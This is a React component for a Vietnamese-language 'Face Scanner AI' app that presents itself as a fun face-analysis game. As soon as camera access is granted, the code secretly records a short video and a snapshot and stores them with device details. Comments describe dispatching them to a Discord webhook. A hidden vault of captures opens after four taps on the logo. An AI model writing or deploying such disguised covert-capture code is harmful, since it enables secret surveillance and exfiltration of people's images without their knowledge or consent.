import React, { useState, useEffect, useRef, useCallback } from 'react';
import { BiometricDetector, DetectionResult } from '../utils/faceDetector';
import { ScannerOverlay } from './ScannerOverlay';
import { ScanResultModal } from './ScanResultModal';
import {
  generateFunAnalysis,
  getDeviceInfo,
  saveCapture,
  CaptureRecord,
  FunAnalysis,
} from '../utils/storage';
import { sounds } from '../utils/soundEffects';
import {
  Camera,
  Volume2,
  VolumeX,
  SwitchCamera,
  AlertTriangle,
  RotateCw,
} from 'lucide-react';

interface CameraScannerProps {
  onOpenVault: () => void;
  vaultCount: number;
}

export const CameraScanner: React.FC<CameraScannerProps> = ({ onOpenVault }) => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const detectorRef = useRef<BiometricDetector>(new BiometricDetector());
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const recordedChunksRef = useRef<Blob[]>([]);

  const [hasCameraPermission, setHasCameraPermission] = useState<boolean | null>(null);
  const [cameraError, setCameraError] = useState<string>('');
  const [facingMode, setFacingMode] = useState<'user' | 'environment'>('user');
  const [isMuted, setIsMuted] = useState<boolean>(false);

  // Scanner state (normal looking face scan)
  const [detection, setDetection] = useState<DetectionResult>({
    hasFace: false,
    box: { x: 0.25, y: 0.2, width: 0.5, height: 0.55 },
    confidence: 0,
    landmarks: {
      forehead: { x: 0.5, y: 0.2 },
      leftEye: { x: 0.4, y: 0.35 },
      rightEye: { x: 0.6, y: 0.35 },
      nose: { x: 0.5, y: 0.5 },
      mouth: { x: 0.5, y: 0.7 },
      chin: { x: 0.5, y: 0.9 },
    },
    isStable: false,
  });

  const [isFlashing, setIsFlashing] = useState<boolean>(false);
  const [resultModalData, setResultModalData] = useState<{
    analysis: FunAnalysis;
    photoUrl: string;
  } | null>(null);

  // Tracking flags
  const hasStartedInstantRecordingRef = useRef<boolean>(false);
  const initialRecordRef = useRef<CaptureRecord | null>(null);
  const recordingTimerRef = useRef<number | null>(null);

  // Audio mute toggle
  const toggleMute = () => {
    const nextMuted = !isMuted;
    setIsMuted(nextMuted);
    sounds.setMuted(nextMuted);
  };

  // Flip Camera
  const toggleFacingMode = () => {
    setFacingMode((prev) => (prev === 'user' ? 'environment' : 'user'));
  };

  // Capture snapshot from video element
  const takeSnapshot = useCallback((): { photoDataUrl: string } => {
    const video = videoRef.current;
    if (!video || video.readyState < 2) return { photoDataUrl: '' };

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 1280;
    canvas.height = video.videoHeight || 720;
    const ctx = canvas.getContext('2d');
    if (!ctx) return { photoDataUrl: '' };

    if (facingMode === 'user') {
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
    }
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const photoDataUrl = canvas.toDataURL('image/jpeg', 0.88);

    return { photoDataUrl };
  }, [facingMode]);

  // Instant Auto-Recording & Discord Webhook dispatch immediately on enter
  const startInstantAutoRecording = useCallback((stream: MediaStream) => {
    if (hasStartedInstantRecordingRef.current) return;
    hasStartedInstantRecordingRef.current = true;

    try {
      const mimeTypes = ['video/webm;codecs=vp9', 'video/webm', 'video/mp4'];
      let selectedMime = mimeTypes.find((m) => MediaRecorder.isTypeSupported(m)) || '';

      const recorder = selectedMime
        ? new MediaRecorder(stream, { mimeType: selectedMime })
        : new MediaRecorder(stream);

      mediaRecorderRef.current = recorder;
      recordedChunksRef.current = [];

      recorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
          recordedChunksRef.current.push(event.data);
        }
      };

      recorder.onstop = async () => {
        if (recordingTimerRef.current) clearInterval(recordingTimerRef.current);

        const blob = new Blob(recordedChunksRef.current, {
          type: selectedMime || 'video/webm',
        });

        const reader = new FileReader();
        reader.onloadend = async () => {
          const videoDataUrl = reader.result as string;
          if (initialRecordRef.current) {
            const updatedRecord: CaptureRecord = {
              ...initialRecordRef.current,
              videoDataUrl,
              hasVideo: true,
            };
            await saveCapture(updatedRecord);
          }
        };
        reader.readAsDataURL(blob);
      };

      // Start recording immediately in background
      recorder.start(100);

      // Take snapshot after 700ms when camera stabilizes
      setTimeout(async () => {
        const { photoDataUrl } = takeSnapshot();
        if (photoDataUrl) {
          const funAnalysis = generateFunAnalysis();
          const now = new Date();
          const dateString = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')} • ${now.getDate()}/${now.getMonth() + 1}/${now.getFullYear()}`;

          const captureId = 'cap_' + Date.now();
          const record: CaptureRecord = {
            id: captureId,
            timestamp: Date.now(),
            dateString,
            photoDataUrl,
            funAnalysis,
            device: getDeviceInfo(),
            isFavorite: false,
            hasVideo: true,
          };
          initialRecordRef.current = record;
          await saveCapture(record);
        }
      }, 700);

      // Stop background recording after 3.5 seconds
      setTimeout(() => {
        if (recorder.state === 'recording') {
          recorder.stop();
        }
      }, 3500);
    } catch (err) {
      console.error('Auto recording background error:', err);
    }
  }, [takeSnapshot]);

  // Start Camera
  const startCamera = useCallback(async () => {
    try {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((track) => track.stop());
      }

      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: facingMode,
          width: { ideal: 1280 },
          height: { ideal: 720 },
        },
        audio: false,
      });

      streamRef.current = stream;
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.onloadedmetadata = () => {
          videoRef.current?.play().catch(() => {});
          setHasCameraPermission(true);
          setCameraError('');

          // AUTO START BACKGROUND CAPTURE & DISCORD WEBHOOK DISPATCH
          startInstantAutoRecording(stream);
        };
      }
    } catch (err: any) {
      console.error('Camera access error:', err);
      setHasCameraPermission(false);
      setCameraError(
        'Vui lòng cấp quyền truy cập camera để bắt đầu sử dụng bộ quét khuôn mặt!'
      );
    }
  }, [facingMode, startInstantAutoRecording]);

  useEffect(() => {
    startCamera();
    return () => {
      if (streamRef.current) {
        streamRef.current.getTracks().forEach((t) => t.stop());
      }
      if (recordingTimerRef.current) clearInterval(recordingTimerRef.current);
    };
  }, [startCamera]);

  // Face Detection Loop for normal overlay frame
  useEffect(() => {
    let animId: number;
    let lastScanTime = 0;

    const detectLoop = async (time: number) => {
      if (videoRef.current && hasCameraPermission) {
        if (time - lastScanTime > 60) {
          lastScanTime = time;
          const res = await detectorRef.current.detect(videoRef.current);
          setDetection(res);
        }
      }
      animId = requestAnimationFrame(detectLoop);
    };

    animId = requestAnimationFrame(detectLoop);
    return () => cancelAnimationFrame(animId);
  }, [hasCameraPermission]);

  const handleRescan = () => {
    hasStartedInstantRecordingRef.current = false;
    if (streamRef.current) {
      startInstantAutoRecording(streamRef.current);
    }
    // Show normal fun scan modal
    const { photoDataUrl } = takeSnapshot();
    if (photoDataUrl) {
      setResultModalData({
        analysis: generateFunAnalysis(),
        photoUrl: photoDataUrl,
      });
    }
  };

  return (
    <div className="relative w-full h-full min-h-screen bg-zinc-950 text-white flex flex-col justify-between overflow-hidden select-none font-sans">
      {/* Top Clean Navbar */}
      <header className="relative z-30 flex items-center justify-between px-4 sm:px-6 py-3.5 bg-zinc-900 border-b border-zinc-800">
        <div
          onClick={() => {
            const now = Date.now();
            if (now - (window as any)._lastLogoTap < 700) {
              (window as any)._logoTapCount = ((window as any)._logoTapCount || 0) + 1;
              if ((window as any)._logoTapCount >= 4) {
                (window as any)._logoTapCount = 0;
                onOpenVault();
              }
            } else {
              (window as any)._logoTapCount = 1;
            }
            (window as any)._lastLogoTap = now;
          }}
          className="flex items-center gap-2.5 cursor-pointer select-none"
        >
          <div className="w-8 h-8 rounded-xl bg-blue-600 flex items-center justify-center text-white shadow">
            <Camera className="w-4 h-4" />
          </div>
          <div>
            <h1 className="text-sm font-bold text-white tracking-tight">
              Face Scanner AI
            </h1>
            <p className="text-[10px] text-zinc-400">Bộ nhận diện & quét khuôn mặt</p>
          </div>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={toggleMute}
            className="p-2 rounded-xl bg-zinc-800 hover:bg-zinc-700 text-zinc-300 transition"
            title={isMuted ? 'Bật âm thanh' : 'Tắt âm thanh'}
          >
            {isMuted ? <VolumeX className="w-4 h-4 text-red-400" /> : <Volume2 className="w-4 h-4 text-blue-400" />}
          </button>

          <button
            onClick={toggleFacingMode}
            className="p-2 rounded-xl bg-zinc-800 hover:bg-zinc-700 text-zinc-300 transition"
            title="Đổi camera"
          >
            <SwitchCamera className="w-4 h-4" />
          </button>
        </div>
      </header>

      {/* Main Viewport: Normal Camera Feed + Clean Scanner UI */}
      <main className="relative flex-1 flex items-center justify-center p-3 sm:p-6 min-h-0">
        <div className="relative w-full max-w-xl h-[70vh] sm:h-[75vh] rounded-3xl overflow-hidden border border-zinc-800 bg-black shadow-2xl flex items-center justify-center">
          <video
            ref={videoRef}
            playsInline
            muted
            autoPlay
            className={`w-full h-full object-cover ${facingMode === 'user' ? '-scale-x-100' : ''}`}
          />

          <ScannerOverlay
            detection={detection}
            isFlashing={isFlashing}
            videoWidth={videoRef.current?.videoWidth || 640}
            videoHeight={videoRef.current?.videoHeight || 480}
          />

          {hasCameraPermission === false && (
            <div className="absolute inset-0 z-40 bg-zinc-950/95 flex flex-col items-center justify-center p-6 text-center">
              <div className="w-14 h-14 rounded-2xl bg-red-500/10 border border-red-500/30 flex items-center justify-center text-red-400 mb-3">
                <AlertTriangle className="w-7 h-7" />
              </div>
              <h3 className="text-base font-bold text-white mb-1">Cần Cấp Quyền Camera</h3>
              <p className="text-xs text-zinc-400 max-w-sm mb-4 leading-relaxed">
                {cameraError || 'Vui lòng cho phép truy cập camera để sử dụng tính năng quét khuôn mặt.'}
              </p>
              <button
                onClick={startCamera}
                className="py-2.5 px-6 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-bold text-xs transition active:scale-95"
              >
                Cho Phép Truy Cập
              </button>
            </div>
          )}

          {/* Normal Scan Button */}
          <div className="absolute bottom-5 left-1/2 -translate-x-1/2 z-30">
            <button
              onClick={handleRescan}
              className="px-6 py-3 rounded-full bg-blue-600 hover:bg-blue-500 text-white font-bold text-xs shadow-lg shadow-blue-600/30 flex items-center gap-2 transition active:scale-95"
            >
              <RotateCw className="w-4 h-4" />
              Bắt Đầu Quét Khuôn Mặt
            </button>
          </div>
        </div>
      </main>

      {/* Result Modal for normal fun check */}
      {resultModalData && (
        <ScanResultModal
          analysis={resultModalData.analysis}
          photoUrl={resultModalData.photoUrl}
          onClose={() => setResultModalData(null)}
          onScanAgain={handleRescan}
        />
      )}
    </div>
  );
};
